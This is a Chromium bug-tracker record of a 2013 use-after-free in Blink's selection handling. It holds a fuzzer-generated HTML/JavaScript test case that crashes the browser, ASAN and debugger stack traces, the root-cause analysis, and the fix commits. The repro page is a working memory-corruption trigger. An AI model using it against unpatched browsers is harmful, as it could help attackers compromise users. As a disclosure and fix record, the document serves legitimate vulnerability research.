# Heap-use-after-free in WebCore::RenderObject::childAt

| Field | Value |
|-------|-------|
| **Issue ID** | [40078126](https://issues.chromium.org/issues/40078126) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Editing |
| **Reporter** | cl...@gmail.com |
| **Assignee** | yo...@chromium.org |
| **Created** | 2013-09-19 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the Chrome ASAN build.

**VERSION**  

Chrome Version: asan-symbolized-linux-release-223354  

Operating System: Linux 64-bit

**REPRODUCTION CASE**

<html>
<head>
<script>
function start() {
o2=document.createElement('iframe');
document.getElementById('store\_div').appendChild(o2);
o3=document.createElement('iframe');
document.getElementById('store\_div').appendChild(o3);
o5=document.createElement('iframe');
document.getElementById('store\_div').appendChild(o5);
o7=document.documentElement;
o12=document.getElementById('fuzz\_div');
o22=document.createElement('form');
window.setTimeout('window.top.start\_reload0()',10);
}
function start\_reload0() {
o55=o2.contentWindow.document;
o76=document.createElement('style');
document.head.appendChild(o76);
o142=o55.createRange();
o142.selectNodeContents(o12);
o12.appendChild(o22);
o12.contentEditable=true;
document.styleSheets[0].insertRule('form:after { content: "BEFOREAFTER"; opacity: 1; }', 0);
o250=o5.contentWindow.document;
o306=window.getSelection();
o306.addRange(o142);
document.execCommand('inserthtml',false,unescape('<iframe></iframe>'));
o323=o3.contentWindow.document;
o7.addEventListener('DOMNodeRemovedFromDocument', cb\_event\_DOMNodeRemovedFromDocument\_207\_1, true);
o550=o250.documentElement;
o697=o7.cloneNode(true);
o550.appendChild(o697);
o705=o250.documentElement;
o706=o323.documentElement;
o250.removeChild(o705);
o250.appendChild(o706);
o323.appendChild(o705);
o697.style.cssText =null;
o721=new MutationObserver(cb\_observer\_319\_1);
o721.observe(o697, {childList: true, attributes: true, subtree: true, attributeOldValue: true});
o55.open();
o12.innerHTML =null;
}
function cb\_event\_DOMNodeRemovedFromDocument\_207\_1() {
o55.location.reload();
o887=o250.documentElement;
o323.querySelector('[style]').style.cssText = '';
document.execCommand('selectall',false,null);
}
function cb\_observer\_319\_1() {
o887.appendChild(o22);
}
</script>
</head>
<body onload="start()">
<div id='store\_div'></div>
<div id='fuzz\_div'></div>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: See attached stack.txt for ASAN output

## Attachments

- [stack.txt](attachments/stack.txt) (text/plain; charset=us-ascii, 17.1 KB)

## Timeline

### in...@chromium.org (2013-09-19)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-19)

ClusterFuzz is now working on this testcase. See https://cluster-fuzz.appspot.com/testcase?key=5261776581033984

### in...@chromium.org (2013-09-19)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-19)

ClusterFuzz thinks that this bug might be eligible for a reward! Forwarding to reward panel for consideration.

### cl...@chromium.org (2013-09-20)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5261776581033984

Uploader: inferno@chromium.org
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000094280
Crash State:
  - crash stack -
  WebCore::RenderObject::childAt
  WebCore::RenderView::setSelection
  - free stack -
  WebCore::Node::detach
  WebCore::ContainerNode::detach
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=183264:183765

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96_RJhLUWHaTOPF2Cjm0RgLNjnFjQ5hYhyfCmOKzpnV8gMGfVx2FYClAzPoQttUSfhWRcHUp8wzvWrTVLt4MuToWr6DM9DBKN1upm6247AjBdexTHlXsHROVFErRAp7FqYKOyCqAxMaXSECFFVjVDspnh0lcw



### in...@chromium.org (2013-09-20)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-09-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-20)

Adding milestone and impact labels.

### in...@chromium.org (2013-09-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-09-20)

Adding milestone and impact labels.

### in...@chromium.org (2013-09-25)

Did you saw our new criteria for possibly issuing higher rewards? See http://www.chromium.org/Home/chromium-security/vulnerability-rewards-program/reward-nomination-process
E.g. If you are able to provide a repro that faulted at an address of 0x41414141, it will qualify for the new higher rewards. Or, if you can show that you have control between free and crash points, etc.

### jw...@chromium.org (2013-09-25)

Yosi, this seems to have a lot to do with FrameSelection. Can you take a look? Thanks!

### yo...@chromium.org (2013-09-26)

[Empty comment from Monorail migration]

### jw...@chromium.org (2013-09-27)

[Empty comment from Monorail migration]

### yo...@chromium.org (2013-10-01)

It takes 1 minute to get AV.

Here is stack trace:

webkit.dll!WebCore::RenderObject::firstChild() Line 168
webkit.dll!WebCore::RenderObject::childAt(unsigned int index) Line 435
webkit.dll!WebCore::rendererAfterPosition(WebCore::RenderObject * object, unsigned int offset) Line 632
webkit.dll!WebCore::RenderView::setSelection(WebCore::RenderObject * start, int startPos, WebCore::RenderObject * end, int endPos, WebCore::RenderView::SelectionRepaintMode blockRepaintMode) Line 766
webkit.dll!WebCore::FrameSelection::updateAppearance() Line 1693
webkit.dll!WebCore::FrameView::performPostLayoutTasks() Line 2239
webkit.dll!WebCore::FrameView::scheduleOrPerformPostLayoutTasks() Line 942
webkit.dll!WebCore::FrameView::layout(bool allowSubtree) Line 1119
webkit.dll!WebCore::Document::updateLayout() Line 1811
webkit.dll!WebCore::VisibleSelection::toNormalizedRange() Line 154
webkit.dll!WebCore::DOMSelection::addRange(WebCore::Range * r) Line 412
webkit.dll!WebCore::DOMSelectionV8Internal::addRangeMethod(const v8::FunctionCallbackInfo<v8::Value> & args) Line 391
webkit.dll!WebCore::DOMSelectionV8Internal::addRangeMethodCallback(const v8::FunctionCallbackInfo<v8::Value> & args) Line 396
v8.dll!v8::internal::FunctionCallbackArguments::Call(void (const v8::FunctionCallbackInfo<v8::Value> &) * f) Line 57
v8.dll!v8::internal::HandleApiCallHelper<0>(v8::internal::`anonymous-namespace'::BuiltinArguments<1> args, v8::internal::Isolate * isolate) Line 1200
2ea0a116()	Unknown
[Frames below may be incorrect and/or missing]	
2ea4a777()	Unknown
2ea4a4fb()	Unknown
2ea2eff9()	Unknown
2ea19a6a()	Unknown
v8.dll!v8::internal::Invoke(bool is_construct, v8::internal::Handle<v8::internal::JSFunction> function, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * args, bool * has_pending_exception) Line 120
v8.dll!v8::internal::Execution::Call(v8::internal::Isolate * isolate, v8::internal::Handle<v8::internal::Object> callable, v8::internal::Handle<v8::internal::Object> receiver, int argc, v8::internal::Handle<v8::internal::Object> * argv, bool * pending_exception, bool convert_receiver) Line 183
v8.dll!v8::Script::Run() Line 1819
webkit.dll!WebCore::V8ScriptRunner::runCompiledScript(v8::Handle<v8::Script> script, WebCore::ScriptExecutionContext * context, v8::Isolate * isolate) Line 95
webkit.dll!WebCore::ScriptController::executeScriptAndReturnValue(v8::Handle<v8::Context> context, const WebCore::ScriptSourceCode & source, WebCore::AccessControlStatus corsStatus) Line 224
webkit.dll!WebCore::ScheduledAction::execute(WebCore::Frame * frame) Line 102
webkit.dll!WebCore::ScheduledAction::execute(WebCore::ScriptExecutionContext * context) Line 81
webkit.dll!WebCore::DOMTimer::fired() Line 146
webkit.dll!WebCore::ThreadTimers::sharedTimerFiredInternal() Line 134
webkit.dll!WebCore::ThreadTimers::sharedTimerFired() Line 110
glue_child.dll!webkit_glue::WebKitPlatformSupportImpl::DoTimeout() Line 137
glue_child.dll!base::internal::RunnableAdapter<void (__thiscall webkit_glue::WebKitPlatformSupportImpl::*)(void)>::Run(webkit_glue::WebKitPlatformSupportImpl * object) Line 134
glue_child.dll!base::internal::InvokeHelper<0,void,base::internal::RunnableAdapter<void (__thiscall webkit_glue::WebKitPlatformSupportImpl::*)(void)>,void __cdecl(webkit_glue::WebKitPlatformSupportImpl *)>::MakeItSo(base::internal::RunnableAdapter<void (__thiscall webkit_glue::WebKitPlatformSupportImpl::*)(void)> runnable, webkit_glue::WebKitPlatformSupportImpl * a1) Line 872
glue_child.dll!base::internal::Invoker<1,base::internal::BindState<base::internal::RunnableAdapter<void (__thiscall webkit_glue::WebKitPlatformSupportImpl::*)(void)>,void __cdecl(webkit_glue::WebKitPlatformSupportImpl *),void __cdecl(base::internal::UnretainedWrapper<webkit_glue::WebKitPlatformSupportImpl>)>,void __cdecl(webkit_glue::WebKitPlatformSupportImpl *)>::Run(base::internal::BindStateBase * base) Line 1169
base.dll!base::Callback<void __cdecl(void)>::Run() Line 396
base.dll!base::Timer::RunScheduledTask() Line 187
base.dll!base::BaseTimerTaskInternal::Run() Line 50
base.dll!base::internal::RunnableAdapter<void (__thiscall base::BaseTimerTaskInternal::*)(void)>::Run(base::BaseTimerTaskInternal * object) Line 134
base.dll!base::internal::InvokeHelper<0,void,base::internal::RunnableAdapter<void (__thiscall base::BaseTimerTaskInternal::*)(void)>,void __cdecl(base::BaseTimerTaskInternal *)>::MakeItSo(base::internal::RunnableAdapter<void (__thiscall base::BaseTimerTaskInternal::*)(void)> runnable, base::BaseTimerTaskInternal * a1) Line 872
base.dll!base::internal::Invoker<1,base::internal::BindState<base::internal::RunnableAdapter<void (__thiscall base::BaseTimerTaskInternal::*)(void)>,void __cdecl(base::BaseTimerTaskInternal *),void __cdecl(base::internal::OwnedWrapper<base::BaseTimerTaskInternal>)>,void __cdecl(base::BaseTimerTaskInternal *)>::Run(base::internal::BindStateBase * base) Line 1169
base.dll!base::Callback<void __cdecl(void)>::Run() Line 396
base.dll!base::MessageLoop::RunTask(const base::PendingTask & pending_task) Line 493
base.dll!base::MessageLoop::DeferOrRunPendingTask(const base::PendingTask & pending_task) Line 506
base.dll!base::MessageLoop::DoWork() Line 617
base.dll!base::MessagePumpForUI::DoRunLoop() Line 243
base.dll!base::MessagePumpWin::RunWithDispatcher(base::MessagePump::Delegate * delegate, base::MessagePumpDispatcher * dispatcher) Line 65
base.dll!base::MessagePumpWin::Run(base::MessagePump::Delegate * delegate) Line 48
base.dll!base::MessageLoop::RunInternal() Line 441
base.dll!base::MessageLoop::RunHandler() Line 414
base.dll!base::RunLoop::Run() Line 48
base.dll!base::MessageLoop::Run() Line 312
base.dll!base::Thread::Run(base::MessageLoop * message_loop) Line 159
base.dll!base::Thread::ThreadMain() Line 205
base.dll!base::`anonymous namespace'::ThreadFunc(void * params) Line 74
kernel32.dll!7510336a()	Unknown
ntdll.dll!77039f72()	Unknown
ntdll.dll!77039f45()	Unknown


### yo...@chromium.org (2013-10-01)

The root cause is FrameSelection passes start/end render objects in different RenderView to RenderView::setSelection().

I'm still investigating why this happened.

### cl...@chromium.org (2013-10-01)

Fixing milestone and impact labels.

### yo...@chromium.org (2013-10-04)

In review: https://codereview.chromium.org/25389004/

The root cause is selection can have removed nodes after ContainerNode::removeChildrent(), which is called by set innerHTML, textContents, and so on.

Here is steps until use-after-free:

1. set selection S1 in frame F1 to C1.
2. A.parentNode.innerHTML = ''
 - setInnerHTML calls removeAllChildren() => willRemoveChildren() => notify range/selection => dispatch mutation event
3. mutation event handler set selection S1 to C1.
4. mutation observer move C1 to another frame F2, e.g. IFRAME.
5. remove frame F2.
5. RenderObject::willBeDestroyed() notifies selection S2 in frame F2 of C1; nothing is happened because S2 isn't associated to C1.
6. C1 is freed.
6. selection S1 still holds C1.


### yo...@chromium.org (2013-10-07)

Committed: https://src.chromium.org/viewvc/blink?view=revision&revision=159007

### cl...@chromium.org (2013-10-07)

Adding Merge-Requested label.

Please do not merge your fix without first checking with the release manager. 

Once the merge is approved by the release manager, make sure to merge the fix to all the affected branches, i.e stable, beta and trunk (near branch point). You can find branch information on omahaproxy.appspot.com.

If the fix does not merge cleanly or is too risky on uptake on these branches, please change the M-* label to indicate the next milestone.

- Your friendly ClusterFuzz

### cl...@chromium.org (2013-10-07)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-10-08)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=159007

------------------------------------------------------------------------
r159007 | yosin@chromium.org | 2013-10-07T06:09:19.660836Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/editing/selection/selection-change-in-blur-event-by-remove-children-expected.txt?r1=159007&r2=159006&pathrev=159007
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/editing/selection/selection-change-in-mutation-event-by-remove-children.html?r1=159007&r2=159006&pathrev=159007
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/Range/range-created-during-remove-children-expected.txt?r1=159007&r2=159006&pathrev=159007
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/dom/ContainerNode.cpp?r1=159007&r2=159006&pathrev=159007
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/editing/selection/selection-change-in-blur-event-by-remove-children.html?r1=159007&r2=159006&pathrev=159007
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/dom/Range/range-created-during-remove-children.html?r1=159007&r2=159006&pathrev=159007
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/editing/selection/selection-change-in-mutation-event-by-remove-children-expected.txt?r1=159007&r2=159006&pathrev=159007

Notify nodes removal to Range/Selection after dispatching blur and mutation event

This patch changes notifying nodes removal to Range/Selection after dispatching blur and mutation event. In willRemoveChildren(), like willRemoveChild(); r115686 did same change, although it didn't change willRemoveChildren().

The https://crbug.com/chromium/295010, use-after-free, is caused by setting removed node to Selection in mutation event handler.

BUG=295010
TEST=LayoutTests/fast/dom/Range/range-created-during-remove-children.html, LayoutTests/editing/selection/selection-change-in-mutation-event-by-remove-children.html, LayoutTests/editing/selection/selection-change-in-blur-event-by-remove-children.html
R=tkent@chromium.org

Review URL: https://codereview.chromium.org/25389004
------------------------------------------------------------------------

### in...@chromium.org (2013-10-11)

[Comment Deleted]

### cl...@chromium.org (2013-10-11)

[Comment Deleted]

### cl...@chromium.org (2013-10-11)

[Comment Deleted]

### cl...@chromium.org (2013-10-11)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone labels first. Make sure to re-request merge for every milestone in the Merge-To-M-* label. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### in...@chromium.org (2013-10-18)

This was found externally and a high severity security vuln, we should definitely merge to m31.

### la...@google.com (2013-10-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-10-21)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/blink?view=rev&rev=160037

------------------------------------------------------------------------
r160037 | yosin@chromium.org | 2013-10-21T01:33:56.273626Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/editing/selection/selection-change-in-mutation-event-by-remove-children-expected.txt?r1=160037&r2=160036&pathrev=160037
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/editing/selection/selection-change-in-blur-event-by-remove-children-expected.txt?r1=160037&r2=160036&pathrev=160037
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/editing/selection/selection-change-in-mutation-event-by-remove-children.html?r1=160037&r2=160036&pathrev=160037
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/fast/dom/Range/range-created-during-remove-children-expected.txt?r1=160037&r2=160036&pathrev=160037
   M http://src.chromium.org/viewvc/blink/branches/chromium/1650/Source/core/dom/ContainerNode.cpp?r1=160037&r2=160036&pathrev=160037
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/editing/selection/selection-change-in-blur-event-by-remove-children.html?r1=160037&r2=160036&pathrev=160037
   A http://src.chromium.org/viewvc/blink/branches/chromium/1650/LayoutTests/fast/dom/Range/range-created-during-remove-children.html?r1=160037&r2=160036&pathrev=160037

Merge 159007 "Notify nodes removal to Range/Selection after disp..."

> Notify nodes removal to Range/Selection after dispatching blur and mutation event
> 
> This patch changes notifying nodes removal to Range/Selection after dispatching blur and mutation event. In willRemoveChildren(), like willRemoveChild(); r115686 did same change, although it didn't change willRemoveChildren().
> 
> The https://crbug.com/chromium/295010, use-after-free, is caused by setting removed node to Selection in mutation event handler.
> 
> BUG=295010
> TEST=LayoutTests/fast/dom/Range/range-created-during-remove-children.html, LayoutTests/editing/selection/selection-change-in-mutation-event-by-remove-children.html, LayoutTests/editing/selection/selection-change-in-blur-event-by-remove-children.html
> R=tkent@chromium.org
> 
> Review URL: https://codereview.chromium.org/25389004

TBR=yosin@chromium.org

Review URL: https://codereview.chromium.org/30663003
------------------------------------------------------------------------

### in...@chromium.org (2013-10-21)

[Empty comment from Monorail migration]

### mb...@chromium.org (2013-10-22)

Thanks for the report! This one qualifies for a $2000 reward because there is control between the free and use.

### mb...@chromium.org (2013-11-08)

[Empty comment from Monorail migration]

### in...@chromium.org (2013-11-12)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-14)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-12-18)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-12-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-02-06)

Bulk update: removing view restriction from closed bugs.

### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### yu...@google.com (2024-01-06)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-06)

This issue was migrated from crbug.com/chromium/295010?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/278401]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078126)*
